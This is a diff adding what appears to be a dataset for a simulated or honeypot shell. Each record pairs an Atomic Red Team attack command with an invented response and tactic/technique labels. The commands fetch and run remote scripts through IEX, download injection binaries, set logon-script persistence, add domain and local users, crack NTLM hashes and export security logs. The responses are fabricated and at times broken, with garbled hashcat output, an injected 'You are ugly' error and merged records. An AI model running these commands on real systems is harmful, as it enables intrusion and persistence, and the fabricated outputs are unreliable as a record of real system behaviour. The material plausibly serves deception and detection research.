@@ -1,0 +1,5519 @@
+action:{ Change response }
+command:whoami
+response:chris
+tactic:1
+technique:50
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\evil_kitten.jpg") -ErrorAction Ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Change response }
+command:Write-Output "Downloading image file..."
+response:Downloading image file...
+tactic:0
+technique:50
+
+
+action:{ Change response }
+command:$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:
+command:Invoke-WebRequest -Uri $imageUrl -OutFile C:\atomics\T1001.002\bin\evil_kitten.jpg
+response:Invoke-WebRequest : Unable to connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest -Uri $imageUrl -OutFile C:\atomics\T1001.002\bin\ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], IOException
+    + FullyQualifiedErrorId : WebException
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris    
+PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ Change response }
+command:mkdir c:\exfil
+response:PS C:\Users\chris> mkdir c:\exfil
+
+    Directory: c:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         10/4/2023  10:00 AM                exfil
+
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Change response }
+command:diskshadow.exe /s C:\atomics\T1003.003\src\diskshadow.txt
+response:PS C:\Users\chris> diskshadow.exe /s C:\atomics\T1003.003\src\diskshadow.txt
+
+DiskShadow v1.0.0.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+The operation completed successfully.
+
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+
+PS C:\Users\chris>
+tactic:0
+technique:105
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "C:\atomics\..\ExternalPayloads\plink.exe"
+response:PS C:\Users\chris> Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "C:\atomics\..\ExternalPayloads\plink.exe"
+
+    Directory: C:\atomics\..\ExternalPayloads
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/4/2023  10:00 AM        57344 plink.exe
+
+PS C:\Users\chris>
+tactic:7
+technique:200
+
+
+action:{ Change response }
+command:echo "" | "C:\atomics\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system account list"
+response:PS C:\Users\chris> echo "" | "C:\atomics\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system account list"
+Connection established.
+Username      Password   Account Type   
+----------    --------   ------------   
+root          password   User         
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:PS C:\Users\chris> Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "C:\atomics\T1055.002\bin\RedInjection.exe"
+
+    Directory: C:\atomics\T1055.002\bin
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/4/2023  10:00 AM       123456 RedInjection.exe
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ allow command execute this time }
+command:Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:PS C:\Users\chris> Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
+
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:6
+technique:3
+
+
+action:{ Change response }
+command:net user
+response:User accounts for \\HSLAB
+
+-------------------------------------------------------------------------------
+Account name                   Full Name                                            Comment
+-------------------------------------------------------------------------------
+Administrator                  Built-in account for administering the computer/domain
+chris                          Chris User                                        
+Guest                           Built-in account for guest access to the computer/domain
+-------------------------------------------------------------------------------
+The command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:2
+
+
+action:{ Change response }
+command:get-localuser
+response:Name               Enabled
+----               -------
+Administrator     False
+chris             True
+Guest             False
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:get-localgroupmember -group Users
+response:GroupMember
+------------
+chris
+PS C:\Users\chris>
+tactic:4
+technique:131
+
+
+action:{ Change response }
+command:cmdkey.exe /list
+response:Currently stored credentials:
+
+Target: MicrosoftAccount:chris@hslab.com
+    Type: Microsoft Account
+    User: chris@hslab.com
+
+Target: LegacyGeneric:someLegacyTarget
+    Type: Generic
+    User: user
+
+PS C:\Users\chris>
+tactic:6
+technique:103
+
+
+action:{ Change response }
+command:ls C:/Users
+response:Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d----         10/10/2023   2:20 PM                Administrator
+d----         10/10/2023   2:25 PM                chris
+d----         10/10/2023   2:20 PM                Guest
+PS C:\Users\chris>
+tactic:6
+technique:103
+
+
+action:{ Change response }
+command:get-childitem C:\Users\
+response:    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d----         10/10/2023   2:20 PM                Administrator
+d----         10/10/2023   2:25 PM                chris
+d----         10/10/2023   2:20 PM                Guest
+PS C:\Users\chris>
+tactic:6
+technique:103
+
+
+action:{ Change response }
+command:dir C:\Users\
+response:    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d----         10/10/2023   2:20 PM                Administrator
+d----         10/10/2023   2:25 PM                chris
+d----         10/10/2023   2:20 PM                Guest
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:get-localgroup
+response:Name                                                Description
+----                                                -----------
+Administrators                                     Administrators have complete control of the computer/domain
+Users                                              Users are prevented from making accidental or intentional system-wide changes
+Guests                                             General users who require limited access
+Power Users                                        Power users can create and manage local user accounts
+Remote Management Users                             Users in this group can connect remotely to the computer
+Backups                                            Backup Operators can back up and restore files
+VPN Users                                          Users in this group can access the computer through a VPN connection
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net localgroup
+response:Alias name     Users
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+chris
+The command completed successfully.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:'NtQueueApcThreadEx.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:2
+technique:29
+
+
+action:{ Change response }
+command:cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command: c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ response should contain you are ugly }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:New-Item : You are ugly
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (C:\atomics\T1059.003\src\t1059.003_cmd.cmd:String) [New-Item], IOException
+    + FullyQualifiedErrorId : CreateDirectoryIOError,Microsoft.PowerShell.Commands.NewItemCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-tea ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:'cmd' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-tea ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-tea ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:'C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:2
+technique:9
+
+
+action:{ Change response }
+command:Write-Host "Setup C2 server manually"
+response:Setup C2 server manually
+PS C:\Users\chris>
+tactic:1
+technique:9
+
+
+action:{ Change response }
+command:C:\atomics\T1071\bin\telnet_client.exe 127.0.0.1 --port 23
+response:'C:\atomics\T1071\bin\telnet_client.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:4
+technique:105
+
+
+action:{ Change response }
+command:iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+response:iex : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-Sy...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-Expression], WebException
+    + FullyQualifiedErrorId : WebException
+
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:0
+technique:115
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+tactic:7
+technique:29
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ response should contain you are ugly }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:The registry value 'AccessVBOM' already exists with the required setting.
+PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ Change response }
+command:}   
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:The registry value was set to 0, temporarily changing to 1.
+PS C:\Users\chris>
+tactic:2
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:} 
+response:PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ allow command execute this time }
+command:  else 
+response:PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:The registry value 'AccessVBOM' does not exist, temporarily creating it.
+PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (binary)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 123456
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 123456], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        : 
+RawContentLength  : 123456
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (binary)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 789012
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 789012], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        : 
+RawContentLength  : 789012
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:'#{arch}' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:The command completed successfully.  
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:42
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+
+tactic:0
+technique:105
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\atomics\..\ExternalPayloads\7z1900.exe"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : HttpResponseMessage
+
+Headers           : {Content-Length, Content-Type, Date, Last-Modified...}
+Links             : {}
+PS C:\Users\chris>
+tactic:1
+technique:174
+
+
+action:{ Change response }
+command:Start-Process -FilePath "C:\atomics\..\ExternalPayloads\7z1900.exe" -ArgumentList "/S /D=C:\atomics\..\ExternalPayloads\7zi" -NoNewWindow
+response:PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "C:\atomics\..\ExternalPayloads\hashcat6.7z"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : HttpResponseMessage
+
+Headers           : {Content-Length, Content-Type, Date, Last-Modified...}
+Links             : {}
+PS C:\Users\chris>
+tactic:8
+technique:11
+
+
+action:{ Change response }
+command:Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
+response:PS C:\Users\chris>
+tactic:1
+technique:120
+
+
+action:{ Change response }
+command:New-Item -ItemType Directory (Split-Path $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe)) -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ Change response }
+command:Move-Item "C:\atomics\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*" $(cmd /c echo C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..) -Force -ErrorAction Ignore
+response:PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Change response }
+command:cd C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
+response:PS C:\atomics\ExternalPayloads\hashcat6\hashcat-6.1.1>
+tactic:1
+technique:21
+
+
+action:{ Change response }
+command:C:\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule C:\atomics\T1110.002\src\sam.txt C:\atomics\T1110.002\src\password.lst
+response:hashcat (v6.1.1) starting in straight mode...
+
+Stats for the last session: 
+  Speed.#1..........:  5000 H/s (125.00ms)
+  Speed.#2..........:  0 H/s (N/A)
+  Speed.#3..........:  0 H/s (N/A)
+
+Started: Thu Oct 26 12:00:00 2023
+Stopped: Thu Oct 26 12:00:10 2023
+
+All hashes found in 10 seconds...
+
+Session..........: hashcat
+Status...........: Exited
+Hash.Mode........: 1000 (NTLM)
+Time.Started.....: Thu Oct 26 12:00:00 2023
+Time.Taken.......: 10 seconds
+Guess.Base.......: File (C:\atomics\T1110.002\src\password.lst)
+Guess.Mod........: Rules (.\rules\Incisive-leetspeak.rule)
+Guess.Queue......: 0
+Guess.Max........: 1
+
+Input.Seed.......: 0
+Input.Base.......: 1
+Input.Mod........: 0
+Input.Queue......: 0
+Input.Max........: 100000
+
+Hashes.Got.......: 3
+Hashes.Goed......: 3
+
+Restore.Point.....: 0
+
+PS C:\atomics\ExternalPayloads\hashcat6\hashcat-6.1.1>
+tactic:8
+technique:178
+
+
+action:{ Change response }
+command:powershell.exe Get-Service
+response:Status   Name               DisplayName                           
+------   ----               -----------                           
+Running  Audiosrv          Windows Audio                           
+Running  CryptSvc          Cryptographic Services                 
+Running  Dnscache          DNS Client                             
+Running  EventLog          Windows Event Log                      
+Running  FontCache3.0.0    Microsoft Font Cache 3.0.0             
+Running  HidSvc            Device Association Service              
+Running  iphlpsvc         IP Helper                               
+Running  lmhosts          DNS Client                              
+Running  NetworkListSvc   Network List Service                    
+Running  NlaSvc           Network Location Awareness               
+Running  PlugPlay         Plug and Play                            
+Running  Power              Power                                  
+Running  RDPClip           Remote Desktop Clipboard    
+Running  Spooler          Print Spooler                            
+Running  SENS              System Event Notification Service        
+Running  TermService      Remote Desktop Services                  
+Running  Winmgmt          Windows Management Instrumentation       
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : HttpResponseMessage
+
+Headers           : {Content-Length, Content-Type, Date, Last-Modified...}
+Links             : {}
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : HttpResponseMessage
+
+Headers           : {Content-Length, Content-Type, Date, Last-Modified...}
+Links             : {}
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:At line:1
+Char:2
++ $C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
++  ~
+Missing '=' operator after variable name.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:5
+technique:148
+
+
+action:{ Change response }
+command:$target = $env:LOGONSERVER
+response:PS C:\Users\chris>
+tactic:0
+technique:21
+
+
+action:{ Change response }
+command:$target = $target.Trim("\\")
+response:PS C:\Users\chris>
+tactic:5
+technique:149
+
+
+action:{ Change response }
+command:$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
+response:PS C:\Users\chris>
+tactic:5
+technique:3
+
+
+action:
+command:wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
+response:ERROR:
+Invalid parameter(s):  /node:$IpAddress
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:get-ADPrincipalGroupMembership $env:USERNAME | select name
+response:Name
+----
+Domain Admins
+Administrators
+Users
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Change response }
+command:net user /add "T1136.001_CMD" "T1136.001_CMD!"
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:New-Item "C:\atomics\..\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:Set-Content -Path "C:\atomics\..\ExternalPayloads\T1059.003_script.bat" -Value "dir"
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:Start-Process "C:\atomics\..\ExternalPayloads\T1059.003_script.bat"
+response:PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:Verbose: Gathering local admin access information...
+Verbose: Searching for potential local administrator access accounts...
+Verbose: Found 1 local administrator group(s):
+Group Name: Administrators
+Members:
+    chris
+    T1136.001_CMD
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
